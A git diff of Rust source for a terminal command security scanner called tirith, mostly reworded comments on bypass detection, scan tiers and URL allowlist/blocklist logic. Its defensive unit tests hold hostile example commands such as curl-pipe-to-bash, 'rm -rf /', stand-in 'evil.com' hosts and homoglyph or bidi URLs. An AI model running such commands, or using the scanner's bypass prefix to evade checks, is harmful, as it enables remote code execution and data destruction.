@@ -11,7 +11,6 @@ fn extract_raw_path_from_url(raw: &str) -> Option<String> {
     if let Some(idx) = raw.find("://") {
         let after = &raw[idx + 3..];
         if let Some(slash_idx) = after.find('/') {
-            // Find end of path (before ? or #)
             let path_start = &after[slash_idx..];
             let end = path_start.find(['?', '#']).unwrap_or(path_start.len());
             return Some(path_start[..end].to_string());
@@ -60,12 +59,10 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
 
     if matches!(shell, ShellType::Posix | ShellType::Fish) {
         let segments = tokenize::tokenize(input, shell);
-        // Tirith documents `TIRITH=0 <cmd> | <interp>` as a whole-line bypass
-        // (README.md:539, TIRITH.md:804). Multi-segment inputs joined ONLY by
-        // pipe operators are part of that contract. Sequencing separators
-        // (`&&`, `||`, `;`, `&`) form multiple independent commands; bypass
-        // must not suppress analysis of the later ones. See issue #78 (which
-        // regressed the fix originally shipped for #30).
+        // The documented bypass shape is `TIRITH=0 <cmd> | <interp>`. Multi-segment
+        // pipelines share an env (bypass applies to the whole pipeline), but
+        // sequencing operators (`&&`, `||`, `;`, `&`) start independent commands
+        // where bypass must NOT carry over.
         if !all_pipe_separated(&segments) || has_unquoted_ampersand(input, shell) {
             return false;
         }
@@ -76,10 +73,8 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
         return false;
     }
 
-    // POSIX / Fish: VAR=VALUE prefix or env wrapper
-    // (Fish 3.1+ and all POSIX shells support `TIRITH=0 command`)
-
-    // Case 1: Leading VAR=VALUE assignments before the command
+    // POSIX / Fish (Fish 3.1+): leading `VAR=VALUE` assignments, then optionally
+    // an `env` wrapper, then the command. Walk past them looking for TIRITH=0.
     let mut idx = 0;
     while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
         if is_tirith_zero_assignment(&words[idx]) {
@@ -88,7 +83,7 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
         idx += 1;
     }
 
-    // Case 2: First real word is `env` — parse env-style args
+    // If the first real word is `env`, parse its flags and assignments.
     if idx < words.len() {
         let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
         let cmd = cmd.trim_matches(|c: char| c == '\'' || c == '"');
@@ -98,7 +93,6 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
                 let w = &words[idx];
                 if w == "--" {
                     idx += 1;
-                    // After --, remaining are VAR=VALUE or command
                     break;
                 }
                 if tokenize::is_env_assignment(w) {
@@ -117,7 +111,7 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
                         }
                         continue;
                     }
-                    // Short flags that take a separate value arg
+                    // Short flags that take a separate value arg.
                     if w == "-u" || w == "-C" || w == "-S" {
                         idx += 2;
                         continue;
@@ -125,10 +119,9 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
                     idx += 1;
                     continue;
                 }
-                // Non-flag, non-assignment = the command, stop
+                // Non-flag, non-assignment: this is the command word.
                 break;
             }
-            // Check remaining words after -- for TIRITH=0
             while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
                 if is_tirith_zero_assignment(&words[idx]) {
                     return true;
@@ -138,14 +131,13 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
         }
     }
 
-    // PowerShell: $env:TIRITH="0" or $env:TIRITH = "0" (before first ;)
+    // PowerShell: `$env:TIRITH="0"` (single word) or `$env:TIRITH = "0"` (spaced).
     if shell == ShellType::PowerShell {
         for word in &words {
             if is_powershell_tirith_bypass(word) {
                 return true;
             }
         }
-        // Multi-word: $env:TIRITH = "0" (space around =)
         if words.len() >= 3 {
             for window in words.windows(3) {
                 if is_powershell_env_ref(&window[0], "TIRITH")
@@ -158,10 +150,9 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
         }
     }
 
-    // Cmd: "set TIRITH=0 & ..." or 'set "TIRITH=0" & ...'
-    // In cmd.exe, `set TIRITH="0"` stores the literal `"0"` (with quotes) as the
-    // value, so we must NOT strip inner quotes from the value. Only bare `TIRITH=0`
-    // and whole-token-quoted `"TIRITH=0"` are real bypasses.
+    // cmd.exe: `set TIRITH="0"` stores the literal `"0"` (with quotes), so only
+    // bare `TIRITH=0` and whole-token-quoted `"TIRITH=0"` are real bypasses.
+    // Inner double quotes and any single quotes must NOT be stripped.
     if shell == ShellType::Cmd && words.len() >= 2 {
         let first = words[0].to_lowercase();
         if first == "set" {
@@ -254,7 +245,8 @@ fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
         _ => '\\',
     };
 
-    // Take only up to the first unquoted pipe/semicolon/&&/||
+    // Stop at the first unquoted segment boundary — we only care about the
+    // first command's words for bypass detection.
     let mut words = Vec::new();
     let mut current = String::new();
     let chars: Vec<char> = input.chars().collect();
@@ -275,7 +267,7 @@ fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
             ' ' | '\t' => {
                 i += 1;
             }
-            '|' | '\n' | '&' => break, // Stop at segment boundary
+            '|' | '\n' | '&' => break,
             ';' if shell != ShellType::Cmd => break,
             '#' if shell == ShellType::PowerShell => break,
             '\'' if shell != ShellType::Cmd => {
@@ -327,10 +319,9 @@ fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
 
 /// Whether all non-leading segments are joined only by pipe operators (`|`, `|&`).
 ///
-/// Returns `true` for a single segment (trivially). Used by `find_inline_bypass`
-/// to distinguish the documented `TIRITH=0 cmd | interp` bypass shape from
-/// sequencing chains like `TIRITH=0 cmd && evil` or `TIRITH=0 cmd ; evil` where
-/// the bypass must not apply to the second command. Issue #78.
+/// Returns `true` for a single segment. Used to distinguish the documented
+/// `TIRITH=0 cmd | interp` bypass shape from sequencing chains like
+/// `TIRITH=0 cmd && evil` where the bypass must not apply to the second command.
 fn all_pipe_separated(segments: &[crate::tokenize::Segment]) -> bool {
     segments
         .iter()
@@ -373,7 +364,7 @@ fn has_unquoted_ampersand(input: &str, shell: ShellType) -> bool {
                 }
             }
             c if c == escape_char && i + 1 < len => {
-                i += 2; // skip escaped char
+                i += 2;
             }
             '&' => return true,
             _ => i += 1,
@@ -399,23 +390,22 @@ pub fn analyze_returning_policy(ctx: &AnalysisContext) -> (Verdict, Policy) {
 fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     let start = Instant::now();
 
-    // Tier 0: Check bypass flag
     let tier0_start = Instant::now();
     let bypass_env = std::env::var("TIRITH").ok().as_deref() == Some("0");
-    // Inline bypass (`TIRITH=0 cmd | sh`) is honored only in Exec context.
-    // Paste content is attacker-controllable (clipboard can be crafted), so a
-    // `TIRITH=0` prefix in pasted text must NOT grant bypass. FileScan has no
-    // notion of a typed bypass prefix either. Process-level TIRITH=0 env
-    // (user's own shell env) still applies in every context.
+    // Inline bypass (`TIRITH=0 cmd | sh`) is honored ONLY in Exec context.
+    // Paste content is attacker-controllable (clipboard can be crafted) and
+    // FileScan has no notion of a typed prefix, so a `TIRITH=0` token in those
+    // contexts must not grant bypass. Process-level TIRITH=0 env still applies
+    // in every context.
     let bypass_inline =
         ctx.scan_context == ScanContext::Exec && find_inline_bypass(&ctx.input, ctx.shell);
     let bypass_requested = bypass_env || bypass_inline;
     let tier0_ms = tier0_start.elapsed().as_secs_f64() * 1000.0;
 
-    // Tier 1: Fast scan (no I/O)
     let tier1_start = Instant::now();
 
-    // Step 1 (paste only): byte-level scan for control chars
+    // Paste-only: byte-level scan catches control chars that never make it
+    // into the URL/regex view.
     let byte_scan_triggered = if ctx.scan_context == ScanContext::Paste {
         if let Some(ref bytes) = ctx.raw_bytes {
             let scan = extract::scan_bytes(bytes);
@@ -437,15 +427,12 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         false
     };
 
-    // Step 2: URL-like regex scan
     let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);
 
-    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs.
-    // Issue #29 Arm B: exempt bytes inside the arg span of a first-segment
-    // tirith inspection subcommand (`tirith diff/score/why/receipt/explain`).
-    // The carveout only affects the eight Unicode-style rule classes already
-    // filtered at tier 3 (see below) — ANSI/control/escape rules don't fire
-    // in exec mode today.
+    // Exec-only: catch bidi/zero-width/invisible bytes even when no URL fired.
+    // `tirith diff/score/why/receipt/explain` URLs typed by the user are
+    // carved out because they're inspection targets — only the eight Unicode-
+    // style rule classes filtered at tier 3 are affected by this carveout.
     let inert_range = if ctx.scan_context == ScanContext::Exec {
         extract::tirith_inert_arg_range(&ctx.input, ctx.shell)
     } else {
@@ -471,7 +458,6 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
 
     let tier1_ms = tier1_start.elapsed().as_secs_f64() * 1000.0;
 
-    // If nothing triggered, fast exit
     if !byte_scan_triggered && !regex_triggered && !exec_bidi_triggered {
         let total_ms = start.elapsed().as_secs_f64() * 1000.0;
         return (
@@ -485,17 +471,15 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
                     total_ms,
                 },
             ),
-            // Load partial policy even on fast-exit so callers get DLP patterns
-            // for audit redaction. discover_partial is local-only and cheap.
+            // discover_partial is local-only and cheap; callers still need DLP
+            // patterns for audit redaction even on fast-exit.
             Policy::discover_partial(ctx.cwd.as_deref()),
         );
     }
 
-    // Tier 2: Policy + data loading (deferred I/O)
     let tier2_start = Instant::now();
 
     if bypass_requested {
-        // Load partial policy to check bypass settings
         let policy = Policy::discover_partial(ctx.cwd.as_deref());
         let allow_bypass = if ctx.interactive {
             policy.allow_bypass_env
@@ -520,7 +504,6 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             verdict.bypass_honored = true;
             verdict.interactive_detected = ctx.interactive;
             verdict.policy_path_used = policy.path.clone();
-            // Log bypass to audit (include custom DLP patterns from partial policy)
             crate::audit::log_verdict(
                 &verdict,
                 &ctx.input,
@@ -537,22 +520,21 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     policy.load_org_lists(ctx.cwd.as_deref());
     policy.load_trust_entries(ctx.cwd.as_deref());
 
-    // Load threat intelligence DB (fail-open: None if unavailable)
+    // Fail-open: None when the DB is unavailable.
     let threat_db: Option<std::sync::Arc<crate::threatdb::ThreatDb>> =
         crate::threatdb::ThreatDb::cached();
 
     let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;
 
-    // Tier 3: Full analysis
     let tier3_start = Instant::now();
     let mut findings = Vec::new();
 
-    // Track extracted URLs for allowlist/blocklist (Exec/Paste only)
     let mut extracted = Vec::new();
 
     if ctx.scan_context == ScanContext::FileScan {
-        // FileScan: byte scan + configfile rules ONLY.
-        // Does NOT run command/env/URL-extraction rules.
+        // FileScan runs byte-scan + configfile/codefile/rendered rules only.
+        // It does NOT run command/env/URL-extraction rules — the input isn't a
+        // command line, so those rules would produce nonsense findings.
         let byte_input = if let Some(ref bytes) = ctx.raw_bytes {
             bytes.as_slice()
         } else {
@@ -561,7 +543,6 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         let byte_findings = crate::rules::terminal::check_bytes(byte_input);
         findings.extend(byte_findings);
 
-        // Config file detection rules
         findings.extend(crate::rules::configfile::check(
             &ctx.input,
             ctx.file_path.as_deref(),
@@ -569,7 +550,6 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             ctx.is_config_override,
         ));
 
-        // Code file pattern scanning rules
         if crate::rules::codefile::is_code_file(
             ctx.file_path.as_deref().and_then(|p| p.to_str()),
             &ctx.input,
@@ -580,9 +560,8 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             ));
         }
 
-        // Rendered content rules (file-type gated)
         if crate::rules::rendered::is_renderable_file(ctx.file_path.as_deref()) {
-            // PDF files get their own parser
+            // PDFs need their own parser; everything else is treated as text.
             let is_pdf = ctx
                 .file_path
                 .as_deref()
@@ -602,19 +581,14 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             }
         }
     } else {
-        // Exec/Paste: standard pipeline
-
-        // Run byte-level rules for paste context
         if ctx.scan_context == ScanContext::Paste {
             if let Some(ref bytes) = ctx.raw_bytes {
                 let byte_findings = crate::rules::terminal::check_bytes(bytes);
                 findings.extend(byte_findings);
             }
-            // Check for hidden multiline content in pasted text
             let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
             findings.extend(multiline_findings);
 
-            // Check clipboard HTML for hidden content (rich-text paste analysis)
             if let Some(ref html) = ctx.clipboard_html {
                 let clipboard_findings =
                     crate::rules::terminal::check_clipboard_html(html, &ctx.input);
@@ -622,12 +596,11 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             }
         }
 
-        // Invisible character checks apply to both exec and paste contexts
         if ctx.scan_context == ScanContext::Exec {
             let byte_input = ctx.input.as_bytes();
             let scan = extract::scan_bytes(byte_input);
-            // Issue #29 Arm B: re-apply the inert-range carveout here so tier-3
-            // findings line up with tier-1's `exec_bidi_triggered` decision.
+            // Same inert-range carveout as tier-1 so tier-3 findings agree
+            // with `exec_bidi_triggered`.
             let scan = match inert_range.as_ref() {
                 Some(r) => scan.with_ignored_range(r),
                 None => scan,
@@ -641,15 +614,15 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
                 || scan.has_hangul_fillers
                 || scan.has_confusable_text
             {
-                // Pass the inert range down into check_bytes itself so rules
-                // with `Evidence::Text` (e.g. UnicodeTags) are also suppressed
-                // at scan time, not by offset-only post-filter. An offset
-                // post-filter misses Text evidence — that was the leak in the
-                // previous iteration of this fix.
+                // Push the inert range down into check_bytes itself: rules
+                // emitting `Evidence::Text` (e.g. UnicodeTags) have no byte
+                // offset to post-filter against, so they must be suppressed
+                // at scan time.
                 let ignore_ranges: &[std::ops::Range<usize>] = inert_range.as_slice();
                 let byte_findings =
                     crate::rules::terminal::check_bytes_with_ignore(byte_input, ignore_ranges);
-                // Only keep invisible-char findings for exec context.
+                // Exec context keeps invisible-char findings only — ANSI/control
+                // escape rules don't apply to typed commands.
                 findings.extend(byte_findings.into_iter().filter(|f| {
                     matches!(
                         f.rule_id,
@@ -666,16 +639,14 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             }
         }
 
-        // Extract and analyze URLs
         extracted = extract::extract_urls(&ctx.input, ctx.shell);
 
         for url_info in &extracted {
-            // Normalize path if available — use raw extracted URL's path for non-ASCII detection
-            // since url::Url percent-encodes non-ASCII during parsing
+            // url::Url percent-encodes non-ASCII on parse, so non-ASCII path
+            // rules need the raw (pre-parse) path instead.
             let raw_path = extract_raw_path_from_url(&url_info.raw);
             let normalized_path = url_info.parsed.path().map(normalize::normalize_path);
 
-            // Run all rule categories
             let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
             findings.extend(hostname_findings);
 
@@ -694,7 +665,7 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
             findings.extend(ecosystem_findings);
         }
 
-        // Threat intelligence rules (local DB lookup, no network I/O)
+        // Threat intel rules are a local DB lookup — no network I/O on the hot path.
         let threat_findings = crate::rules::threatintel::check(
             &ctx.input,
             ctx.shell,
@@ -703,7 +674,6 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         );
         findings.extend(threat_findings);
 
-        // Run command-shape rules on full input
         let command_findings = crate::rules::command::check(
             &ctx.input,
             ctx.shell,
@@ -712,16 +682,13 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         );
         findings.extend(command_findings);
 
-        // Run credential leak detection rules
         let cred_findings =
             crate::rules::credential::check(&ctx.input, ctx.shell, ctx.scan_context);
         findings.extend(cred_findings);
 
-        // Run environment rules
         let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
         findings.extend(env_findings);
 
-        // Policy-driven network deny/allow
         if !policy.network_deny.is_empty() {
             let net_findings = crate::rules::command::check_network_policy(
                 &ctx.input,
@@ -733,22 +700,20 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         }
     }
 
-    // Custom YAML detection rules
     if !policy.custom_rules.is_empty() {
         let compiled = crate::rules::custom::compile_rules(&policy.custom_rules);
         let custom_findings = crate::rules::custom::check(&ctx.input, ctx.scan_context, &compiled);
         findings.extend(custom_findings);
     }
 
-    // Apply policy severity overrides
     for finding in &mut findings {
         if let Some(override_sev) = policy.severity_override(&finding.rule_id) {
             finding.severity = override_sev;
         }
     }
 
-    // Filter by allowlist/blocklist
-    // Blocklist: if any extracted URL matches blocklist, escalate to Block
+    // A blocklist hit on any extracted URL yields a fresh Critical finding so
+    // the final verdict escalates to Block regardless of other rules.
     for url_info in &extracted {
         if policy.is_blocklisted(&url_info.raw) {
             findings.push(Finding {
@@ -767,8 +732,8 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         }
     }
 
-    // Allowlist: remove findings for URLs that match allowlist
-    // (blocklist takes precedence — if blocklisted, findings remain)
+    // Allowlist drops findings whose URLs are allowlisted, but blocklist wins
+    // when both match: blocklisted URLs keep their findings.
     if !policy.allowlist.is_empty() || !policy.allowlist_rules.is_empty() {
         let blocklisted_urls: Vec<&str> = extracted
             .iter()
@@ -797,8 +762,8 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
                     })
             };
 
-            // Keep if any referenced URL is blocklisted. Otherwise only drop the
-            // finding when every referenced URL is allowlisted for this finding.
+            // Keep when any referenced URL is blocklisted; otherwise drop only
+            // if every referenced URL is allowlisted for this finding.
             urls_in_evidence
                 .iter()
                 .any(|url| blocklisted_urls.contains(url))
@@ -808,11 +773,9 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
         });
     }
 
-    // Enrichment is always enabled in the single-tier runtime.
     enrich_pro(&mut findings);
     enrich_team(&mut findings);
 
-    // Early-access suppression is disabled in the single-tier runtime.
     crate::rule_metadata::filter_early_access(&mut findings, crate::license::Tier::Enterprise);
 
     let tier3_ms = tier3_start.elapsed().as_secs_f64() * 1000.0;
@@ -842,14 +805,10 @@ fn analyze_inner(ctx: &AnalysisContext) -> (Verdict, Policy) {
     (verdict, policy)
 }
 
-// ---------------------------------------------------------------------------
-// Paranoia tier filtering (Phase 15)
-// ---------------------------------------------------------------------------
-
 /// Filter a verdict's findings by paranoia level.
 ///
-/// This is an output-layer filter — the engine always detects everything.
-/// CLI/MCP call this after `analyze()` to reduce noise at lower paranoia levels.
+/// Output-layer only — the engine always detects everything. CLI/MCP call
+/// this after `analyze()` to reduce noise at lower paranoia levels.
 ///
 /// - Paranoia 1-2: Medium+ findings only
 /// - Paranoia 3: also show Low findings
@@ -890,19 +849,16 @@ fn retain_by_paranoia(findings: &mut Vec<Finding>, paranoia: u8) {
     findings.retain(|f| match f.severity {
         crate::verdict::Severity::Info => effective >= 4,
         crate::verdict::Severity::Low => effective >= 3,
-        _ => true, // Medium/High/Critical always shown
+        _ => true,
     });
 }
-
-// ---------------------------------------------------------------------------
-// Finding enrichment
-// ---------------------------------------------------------------------------
 
 /// Pro enrichment: dual-view, decoded content, cloaking diffs, line numbers.
 fn enrich_pro(findings: &mut [Finding]) {
     for finding in findings.iter_mut() {
         match finding.rule_id {
-            // Rendered content findings: show what human sees vs what agent processes
+            // Rendered-content findings carry a dual view: what the human sees
+            // vs. what the AI agent processes.
             crate::verdict::RuleId::HiddenCssContent => {
                 finding.human_view =
                     Some("Content hidden via CSS — invisible in rendered view".into());
@@ -997,7 +953,8 @@ mod tests {
     use super::*;
     #[test]
     fn test_exec_bidi_without_url() {
-        // Input with bidi control but no URL — should NOT fast-exit at tier 1
+        // Bidi control alone (no URL) must reach tier 3; else the exec path
+        // would fast-exit and miss the attack.
         let input = format!("echo hello{}world", '\u{202E}');
         let ctx = AnalysisContext {
             input,
@@ -1012,13 +969,11 @@ mod tests {
             clipboard_html: None,
         };
         let verdict = analyze(&ctx);
-        // Should reach tier 3 (not fast-exit at tier 1)
         assert!(
             verdict.tier_reached >= 3,
             "bidi in exec should reach tier 3, got tier {}",
             verdict.tier_reached
         );
-        // Should have findings about bidi
         assert!(
             verdict
                 .findings
@@ -1034,7 +989,8 @@ mod tests {
 
         let findings = vec![
             Finding {
-                // Synthetic Info finding — VariationSelector is now Medium
+                // Synthetic Info finding; any rule_id works — we just need one
+                // with Severity::Info for the filter to drop.
                 rule_id: RuleId::NonStandardPort,
                 severity: Severity::Info,
                 title: "info finding".into(),
@@ -1077,17 +1033,15 @@ mod tests {
             total_ms: 0.0,
         };
 
-        // Default paranoia (1): only Medium+ shown
         let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
         filter_findings_by_paranoia(&mut verdict, 1);
         assert_eq!(
             verdict.findings.len(),
             1,
-            "paranoia 1 should keep only High+"
+            "paranoia 1 should keep only Medium+"
         );
         assert_eq!(verdict.findings[0].severity, Severity::High);
 
-        // Paranoia 2: still only Medium+ (free tier cap)
         let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
         filter_findings_by_paranoia(&mut verdict, 2);
         assert_eq!(
@@ -1211,7 +1165,6 @@ mod tests {
 
     #[test]
     fn test_no_inline_bypass_powershell_in_posix_mode() {
-        // PowerShell syntax should NOT match when shell is Posix
         assert!(!find_inline_bypass(
             "$env:TIRITH=\"0\"; curl evil.com",
             ShellType::Posix
@@ -1228,7 +1181,7 @@ mod tests {
 
     #[test]
     fn test_inline_bypass_env_c_flag() {
-        // env -C takes a directory arg; TIRITH=0 should still be found after it
+        // `env -C` takes a directory arg; TIRITH=0 after it must still register.
         assert!(find_inline_bypass(
             "env -C /tmp TIRITH=0 curl evil.com",
             ShellType::Posix
@@ -1237,7 +1190,7 @@ mod tests {
 
     #[test]
     fn test_inline_bypass_env_s_flag() {
-        // env -S takes a string arg; TIRITH=0 should still be found after it
+        // `env -S` takes a string arg; TIRITH=0 after it must still register.
         assert!(find_inline_bypass(
             "env -S 'some args' TIRITH=0 curl evil.com",
             ShellType::Posix
@@ -1252,19 +1205,12 @@ mod tests {
         ));
     }
 
-    // -----------------------------------------------------------------------
-    // #78 / #30: pipe-bypass contract
-    //
-    // README.md:539 and TIRITH.md:804 document `TIRITH=0 <cmd> | <interp>` as a
-    // supported whole-line bypass. cdbe48f (the #30 hardening) overshot and
-    // rejected all multi-segment input, which regressed the documented shape.
-    // find_inline_bypass now distinguishes pipe pipelines (shared-bypass shape)
-    // from sequencing chains (bypass must NOT apply to the second command).
-    // -----------------------------------------------------------------------
+    // Pipe-bypass contract: `TIRITH=0 cmd | interp` is a documented
+    // whole-pipeline bypass. Pipe stages share an env; sequencing operators
+    // (`&&`, `||`, `;`, `&`) do not, so bypass must NOT carry across them.
 
     #[test]
     fn test_inline_bypass_allows_pipe_to_sh() {
-        // Exact README.md:539 example.
         assert!(find_inline_bypass(
             "TIRITH=0 curl -L https://something.xyz | bash",
             ShellType::Posix
@@ -1289,7 +1235,6 @@ mod tests {
 
     #[test]
     fn test_inline_bypass_allows_multi_pipe_chain() {
-        // Multiple pipe stages — all still shared bypass.
         assert!(find_inline_bypass(
             "TIRITH=0 curl https://example.com | jq . | bash",
             ShellType::Posix
@@ -1298,7 +1243,7 @@ mod tests {
 
     #[test]
     fn test_inline_bypass_rejects_sequence_with_and_and() {
-        // `&&` creates a new command with a new env — bypass must NOT apply.
+        // `&&` starts a new command with a new env — bypass must NOT apply.
         assert!(!find_inline_bypass(
             "TIRITH=0 curl https://example.com && rm -rf /",
             ShellType::Posix
@@ -1323,7 +1268,8 @@ mod tests {
 
     #[test]
     fn test_inline_bypass_rejects_backgrounding_ampersand() {
-        // Unquoted `&` is a separate-command boundary handled by has_unquoted_ampersand.
+        // Unquoted `&` forks a background command; bypass must not cover the
+        // foreground successor.
         assert!(!find_inline_bypass(
             "TIRITH=0 curl evil.com & bash",
             ShellType::Posix
@@ -1332,7 +1278,7 @@ mod tests {
 
     #[test]
     fn test_inline_bypass_allows_pipe_to_sh_fish() {
-        // Fish tokenization delegates to posix; same contract applies.
+        // Fish tokenization delegates to POSIX; same pipe-bypass contract applies.
         assert!(find_inline_bypass(
             "TIRITH=0 curl -L https://example.com | bash",
             ShellType::Fish
@@ -1376,11 +1322,11 @@ mod tests {
             total_ms: 0.0,
         };
 
-        // Before paranoia filter: action should be Warn (Medium max)
         let mut verdict = Verdict::from_findings(findings, 3, timings);
         assert_eq!(verdict.action, Action::Warn);
 
-        // After paranoia filter at level 1: Low is removed, only Medium remains → still Warn
+        // After paranoia 1: the Low finding is dropped; only the Medium
+        // remains so the action stays Warn.
         filter_findings_by_paranoia(&mut verdict, 1);
         assert_eq!(verdict.action, Action::Warn);
         assert_eq!(verdict.findings.len(), 1);
@@ -1388,7 +1334,7 @@ mod tests {
 
     #[test]
     fn test_powershell_bypass_case_insensitive_tirith() {
-        // PowerShell env vars are case-insensitive
+        // PowerShell env vars are case-insensitive.
         assert!(find_inline_bypass(
             "$env:tirith=\"0\"; curl evil.com",
             ShellType::PowerShell
@@ -1401,7 +1347,7 @@ mod tests {
 
     #[test]
     fn test_powershell_bypass_no_panic_on_multibyte() {
-        // Multi-byte UTF-8 after $ should not panic
+        // Guards against byte-level slicing on multi-byte UTF-8 after `$`.
         assert!(!find_inline_bypass(
             "$a\u{1F389}xyz; curl evil.com",
             ShellType::PowerShell
@@ -1428,18 +1374,14 @@ mod tests {
         ));
     }
 
-    // -----------------------------------------------------------------------
-    // #29: tirith inspection subcommands (`tirith diff/score/why/receipt/explain`)
-    // must not trip URL or Unicode-style rules on their own arguments, because
-    // the user explicitly typed those arguments to have them inspected.
-    // `tirith run` and non-inspection subcommands are unaffected.
-    // -----------------------------------------------------------------------
+    // Tirith inspection subcommands (`tirith diff/score/why/receipt/explain`)
+    // must not trip URL or Unicode-style rules on their own arguments — the
+    // user typed those arguments specifically to have them inspected.
+    // `tirith run` and other subcommands stay on the regular analysis path.
 
     #[test]
     fn test_tirith_run_still_acts_as_sink() {
-        // `tirith run` IS on the sink list — URL-to-sink rules must still fire.
-        // (Renamed from test_tirith_command_is_analyzed_like_any_other_exec
-        // which was misleading once the inert carveout landed.)
+        // `tirith run` IS a sink; URL-to-sink rules must still fire.
         let ctx = exec_ctx("tirith run http://example.com");
         let verdict = analyze(&ctx);
         assert!(verdict.tier_reached >= 3);
@@ -1490,9 +1432,9 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_suppresses_confusable_and_bidi() {
-        // The exec-context byte scan (engine.rs:418 + :587) must also respect
-        // the inert range so ConfusableText / BidiControls / etc. are not
-        // emitted from inside the inspection arg span.
+        // The exec-context byte scan must also respect the inert range so
+        // ConfusableText / BidiControls / etc. aren't emitted for bytes inside
+        // the inspection arg span.
         let input = "tirith score https://ex\u{0430}mple.com/\u{202E}bar";
         let verdict = analyze(&exec_ctx(input));
         for f in &verdict.findings {
@@ -1523,7 +1465,7 @@ mod tests {
 
     #[test]
     fn test_tirith_inspection_with_leading_flag() {
-        // `tirith --quiet diff URL` — flag before subcommand must not defeat the carveout.
+        // A flag before the subcommand must not defeat the carveout.
         let input = "tirith --quiet diff https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_eq!(verdict.action, crate::verdict::Action::Allow);
@@ -1531,8 +1473,8 @@ mod tests {
 
     #[test]
     fn test_tirith_doctor_not_on_inert_list() {
-        // Regression guard: adding a subcommand to the inert list requires a
-        // motivating fixture. `doctor` is NOT on the list; URL rules still fire.
+        // `doctor` is deliberately NOT on the inspection list. Adding any new
+        // subcommand requires a motivating false-positive fixture.
         let input = "tirith doctor https://ex\u{0430}mple.com";
         let verdict = analyze(&exec_ctx(input));
         assert_ne!(
@@ -1545,7 +1487,7 @@ mod tests {
 
     #[test]
     fn test_tirith_run_bidi_in_url_still_fires() {
-        // `tirith run` is a sink, not on the inspection list. Bidi in its URL
+        // `tirith run` is a sink (not on the inspection list); bidi in its URL
         // arg must still fire.
         let input = "tirith run https://evil\u{202E}.com/x.sh";
         let verdict = analyze(&exec_ctx(input));
@@ -1560,8 +1502,6 @@ mod tests {
 
     #[test]
     fn test_tirith_inert_arg_range_covers_expected_span() {
-        // Unit test directly on the helper: range covers everything after the
-        // subcommand word within the first segment.
         let input = "tirith diff https://ex\u{0430}mple.com";
         let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
         // "tirith diff" is 11 bytes; arg span starts at byte 11 and runs to end.
@@ -1571,7 +1511,6 @@ mod tests {
 
     #[test]
     fn test_tirith_inert_arg_range_none_for_run() {
-        // `tirith run` is NOT on the inspection list.
         let range =
             extract::tirith_inert_arg_range("tirith run http://example.com", ShellType::Posix);
         assert!(range.is_none());
@@ -1586,27 +1525,18 @@ mod tests {
 
     #[test]
     fn test_tirith_inert_arg_range_pipe_only_first_segment() {
-        // Second segment is outside the inert range.
+        // Only the first segment is inert; later pipe stages must still analyze.
         let input = "tirith diff foo | curl http://evil.com";
         let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
         assert!(range.end < input.len());
         assert!(!input[range.clone()].contains("curl"));
     }
 
-    // -----------------------------------------------------------------------
-    // #29 review corrections: UnicodeTags leak, sudo wrapper, env URLs, flag
-    // subcommand name false match.
-    // -----------------------------------------------------------------------
-
     #[test]
     fn test_tirith_inspection_suppresses_unicode_tags_evidence_text() {
-        // UnicodeTags emits Evidence::Text, not Evidence::ByteSequence — an
-        // offset-only post-filter would miss it. The carveout must suppress
-        // the rule AT SCAN TIME (inside check_bytes_with_ignore) based on
-        // whether the unicode-tag byte actually lives in the inert range.
-        //
-        // Input: unicode-tag char in the diff's URL arg only. In exec mode,
-        // this bye should be treated as inert and UnicodeTags must not fire.
+        // UnicodeTags emits Evidence::Text (no byte offset), so an offset-only
+        // post-filter would leak it. The inert range must therefore be applied
